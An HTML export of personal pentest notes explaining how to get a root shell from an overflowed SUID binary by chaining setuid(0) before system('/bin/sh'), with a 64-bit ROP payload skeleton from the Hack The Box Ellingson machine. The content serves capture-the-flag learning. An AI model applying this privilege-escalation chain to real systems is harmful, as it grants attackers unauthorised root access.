<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exploit SUID Binaries</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># How-to - Exploit SUID Binaries</h1></strong><br /><br /><strong><h2>## Use setuid(0)</h2></strong><br />Normally, to exploit a simple binary using system() you would just overflow the buffer, call <code>system(&quot;/bin/sh&quot;)</code> and be done with it.<br />That won&#39;t work here because we&#39;re exploiting a SUID binary.<br /><br />Just because the binary has a SUID bit doesn&#39;t mean that it <em>will</em> run as root, just that it has the <em>potential</em> to run as root.<br /><br />In order for <code>system()</code> to spawn a shell as root, you have to first run <code>setuid(0)</code> to set the user ID of the calling process (the exploitable binary) to root. Next, when we run system(), this will ensure that system() runs as root and spawns a root shell.<br /><br /><strong><h3>### 64-bit Example from hackthebox Ellingson</h3></strong><br />Run setuid(0) to set the user ID of the running binary to root.<br />Then system(&quot;/bin/sh&quot;) will spawn a root shell.<br /><div class="codebox"><div class="codebox">payload&nbsp;&nbsp;=&nbsp;&quot;A&quot;*136&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;offset&nbsp;to&nbsp;RIP<br />#Stage&nbsp;2a&nbsp;-&nbsp;setuid(0)<br />payload&nbsp;+=&nbsp;pop_rdi_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;overwrite&nbsp;RIP<br />payload&nbsp;+=&nbsp;null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;0&nbsp;into&nbsp;RDI<br />payload&nbsp;+=&nbsp;libc_setuid_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;setuid(0)<br /><br />#Stage&nbsp;2b&nbsp;-&nbsp;system(&quot;/bin/sh&quot;)<br />payload&nbsp;+=&nbsp;pop_rdi_addr<br />payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;libc&nbsp;&quot;/bin/sh&quot;&nbsp;string&nbsp;into&nbsp;RDI<br />payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;libc&nbsp;system(&quot;/bin/sh&quot;)</div></div></div>
</body>
</html>
